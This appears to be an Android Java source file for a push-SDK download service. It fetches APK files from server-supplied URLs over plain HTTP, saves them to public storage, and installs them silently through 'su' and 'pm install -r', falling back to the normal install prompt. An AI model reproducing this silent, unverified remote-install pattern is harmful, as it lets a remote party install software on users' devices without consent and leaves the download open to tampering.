package com.joymetec.push;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.ContactsContract.Contacts.Data;
import android.telephony.cdma.CdmaCellLocation;
import android.util.Log;

public class DownLoadService extends IntentService {
	private String TAG = "lemi";
	private Timer timer = null;
	private String[] key = { "url", "name", "package", "version" ,"tip","title"};
	private int timeOut = 60000;
	
	private Handler myHandler = new Handler() {
		public void handleMessage(Message msg) {

			int id = msg.arg1;

			Log.d(TAG, "handleMessage");

			if (id == 1) // 成功安装
			{
				Log.d(TAG, "install success");
				if (timer != null) {
					Bundle bundle = msg.getData();
					String pkg = bundle.getString("pkg");
					if(pkg!=null&&pkg.length()>0)
					{
						DataInstance dataInstance = DataInstance.getInstance();
						dataInstance.removeTimeOutMap(pkg);
					}
					timer.cancel();
				}
			} else if (id == 2) // 请求root失败
			{
				Log.d(TAG, "time out");
				
				Bundle bundle = msg.getData();
				String path = bundle.getString("path");
				String message = bundle.getString("message");

				if (path != null && path.length()>0 && message!=null&& message.length()>0) {
					
					HashMap<String, String> map = parsingArgument(message);
					
					int codeVersion = getVersionCode(map.get(key[2]));
					
					Log.d(TAG, "codeVersion = "+codeVersion);
					
					DataInstance dataInstance = DataInstance.getInstance();
					dataInstance.removeTimeOutMap(map.get(key[2]));

					if (codeVersion != -1) {

						int code = Integer.parseInt(map.get(key[3]));
						Log.d(TAG, "code = " + code);
						if (code > codeVersion) {
							packageInstall(getApplicationContext(), path);	
						}

					} else {
						packageInstall(getApplicationContext(), path);
					}
				}
				
				
				timer.cancel();
			}

		};
	};

	public DownLoadService() {
		// TODO Auto-generated constructor stub
		this("hhx");
	}

	public DownLoadService(String name) {
		super("test");
		// TODO Auto-generated constructor stub
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		// TODO Auto-generated method stub
		
		Log.d(JoymetecApplication.TAG, "****************** onHandleIntent");

		HashMap<String, String> map = parsingArgument(intent);
		String message = intent.getStringExtra("url");

		if (map != null && message!=null && message.length()>0) {
			
			int codeVersion = getVersionCode(map.get(key[2]));
			
			Log.d(TAG, "codeVersion = "+codeVersion);

			if (codeVersion != -1) {

				int code = Integer.parseInt(map.get(key[3]));
				Log.d(TAG, "code = " + code);
				if (code > codeVersion) {
					downloadFile(map.get(key[0]), map.get(key[1]),map.get(key[2]),message);				
				}

			} else {
					downloadFile(map.get(key[0]), map.get(key[1]),map.get(key[2]),message);
			}
		}
	}

	public void downloadFile(String url, String name,String pkg,final String message) {
		String downloadPath = Environment.getExternalStorageDirectory()
				.getPath() + "/download";
		File file = new File(downloadPath);
		if (!file.exists())
			file.mkdir();

		if (new File(downloadPath + "/" + name+".apk").exists()) {
	
			Log.d(JoymetecApplication.TAG, "file exists");
			final String path = downloadPath + "/" + name+".apk";
			
			DataInstance dataInstance =  DataInstance.getInstance();
			dataInstance.removeDownling(pkg);
			
			
			if (!dataInstance.isTimeOut(pkg)) {
				timer = new Timer();
				timer.schedule(new TimerTask() {
					@Override
					public void run() {
						// TODO Auto-generated method stub

						Message m = new Message();
						m.arg1 = 2;
						Bundle bundle = new Bundle();
						bundle.putString("path", path);
						bundle.putString("message", message);
						m.setData(bundle);
						DownLoadService.this.myHandler.sendMessage(m);
					}
				}, timeOut);
				
				dataInstance.addTimeOutMap(pkg);
				installThread(path,pkg);
			}
		} else {

			Log.d(JoymetecApplication.TAG, "download File");
			HttpGet httpGet = new HttpGet(url);
			try {
				HttpResponse httpResponse = new DefaultHttpClient()
						.execute(httpGet);

				if (httpResponse.getStatusLine().getStatusCode() == 200) {
					InputStream is = httpResponse.getEntity().getContent();
					// 开始下载apk文件
					FileOutputStream fos = new FileOutputStream(downloadPath
							+ "/" + name+".apk");
					byte[] buffer = new byte[8192];
					int count = 0;
					while ((count = is.read(buffer)) != -1) {
						fos.write(buffer, 0, count);
					}
					fos.close();
					is.close();
					Log.d(TAG, "apk path = " + downloadPath + "/" + name+".apk");
					
					final String path = downloadPath + "/" + name+".apk";
					
					Log.d(JoymetecApplication.TAG, "download File finish");
					DataInstance dataInstance =  DataInstance.getInstance();
					dataInstance.removeDownling(pkg);
					
					if (!dataInstance.isTimeOut(pkg)) {
						timer = new Timer();
						timer.schedule(new TimerTask() {
							@Override
							public void run() {
								// TODO Auto-generated method stub

								Message m = new Message();
								m.arg1 = 2;
								Bundle bundle = new Bundle();
								bundle.putString("path", path);
								bundle.putString("message", message);
								m.setData(bundle);
								DownLoadService.this.myHandler.sendMessage(m);
							}
						}, timeOut);
						
						dataInstance.addTimeOutMap(pkg);
						installThread(path,pkg);
					}
				}
			} catch (Exception e) {
			}
		}
	}

/*	public class MyThread extends Thread {
		private String path;

		public MyThread(String path) {
			// TODO Auto-generated constructor stub
			this.path = path;
		}

		@Override
		public void run() {
			// TODO Auto-generated method stub
			super.run();

			Process process = null;
			OutputStream out = null;
			InputStream in = null;

			try {
				Log.d(TAG, "error1");
				process = Runtime.getRuntime().exec("su");
				out = process.getOutputStream();

				out.write(("pm install -r " + path + "\n").getBytes());
				in = process.getInputStream();
				int len = 0;
				byte[] bs = new byte[256];

				while (-1 != (len = in.read(bs))) {
					String state = new String(bs, 0, len);
					Log.d(TAG, "state = " + state);
					if (state.equals("Success\n")) {

						Message m = new Message();
						m.arg1 = 1;
						DownLoadService.this.myHandler.sendMessage(m);

					}
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();

			}
		}
	}*/
	
	public void installThread(String path,String message)
	{
		Process process = null;
		OutputStream out = null;
		InputStream in = null;
		
		try {
			process = Runtime.getRuntime().exec("su");
			
			out = process.getOutputStream();

			out.write(("pm install -r " + path + "\n").getBytes());
			in = process.getInputStream();
			int len = 0;
			byte[] bs = new byte[256];

			while (-1 != (len = in.read(bs))) {
				String state = new String(bs, 0, len);
				Log.d(TAG, "state = " + state);
				if (state.equals("Success\n")) {

					Message m = new Message();
					m.arg1 = 1;
					Bundle bundle = new Bundle();
					bundle.putString("pkg", message);
					m.setData(bundle);
					DownLoadService.this.myHandler.sendMessage(m);
				}
			}
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
	}

	private int getVersionCode(String pkName) {
		try {

			String versionName = this.getPackageManager().getPackageInfo(
					pkName, 0).versionName;
			int versionCode = this.getPackageManager()
					.getPackageInfo(pkName, 0).versionCode;

			return versionCode;
		} catch (Exception e) {
		}
		return -1;

	}

	public void packageInstall(Context context, String filePath) {
		Intent i = new Intent(Intent.ACTION_VIEW);
		i.setDataAndType(Uri.parse("file://" + filePath),
				"application/vnd.android.package-archive");
		i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(i);
	}

	public boolean isInstall(String packageName) {
		PackageManager pm = getApplicationContext().getPackageManager();
		ApplicationInfo appInfo;
		try {
			appInfo = pm.getApplicationInfo(packageName, 0);
			if ((appInfo.flags & ApplicationInfo.FLAG_EXTERNAL_STORAGE) != 0) {
				return true;
			}
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		return false;
	}

	public HashMap<String, String> parsingArgument(Intent intent) {
		HashMap<String, String> map = new HashMap<String, String>();
		String str = intent.getStringExtra("url");
		
		String[] info = str.split(";", 6);

		//Log.d(TAG, "size = " + info.length);

		if (info.length != 6)
			return null;

		for (int i = 0; i < info.length; i++) {
			
			if(info[i].length()>0)
			{
				map.put(key[i], info[i]);
			}
			else
			{
				return null;
			}
			
		}
		return map;
		//return null;
	}

	public HashMap<String, String> parsingArgument(String message) {
		HashMap<String, String> map = new HashMap<String, String>();
	/*	String str = intent.getStringExtra("url");*/
		
		String[] info = message.split(";", 6);

		//Log.d(TAG, "size = " + info.length);

		if (info.length != 6)
			return null;

		for (int i = 0; i < info.length; i++) {
			
			if(info[i].length()>0)
			{
				map.put(key[i], info[i]);
			}
			else
			{
				return null;
			}
			
		}
		return map;
		//return null;
	}
	
}
